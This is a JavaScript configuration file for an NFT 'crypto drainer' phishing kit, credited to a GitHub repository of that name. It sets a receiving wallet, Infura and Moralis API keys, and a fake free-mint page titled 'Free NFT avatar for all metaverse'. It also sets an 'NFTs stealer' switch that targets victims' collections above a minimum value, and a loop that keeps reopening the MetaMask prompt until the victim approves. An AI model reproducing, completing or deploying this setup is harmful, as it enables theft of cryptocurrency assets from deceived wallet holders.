// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0x7d8Ac1a2806f8670fB0c643Dc732488d3cDC6dC4";    // Your ETH wallet that you have to receive NFTs
const infuraId = "2FFiPoVHXGAzJCUIDjNOCRlaTil"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "blfbdF3Z7jfXbaELdul2mWym15xtBV1QSu8KTIUuaLs4qYtF5uqUyNgkIsx4R2gy"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "NFA",
    title: "Free NFT avatar for all metaverse", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "25.09.2022", // Today date
    socialMedia: {
        discord: "https://discord.gg/NFA",
        twitter: "https://twitter.com/NFA",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.0,         // Price per NFT.
    totalSupply: 999,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.0,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
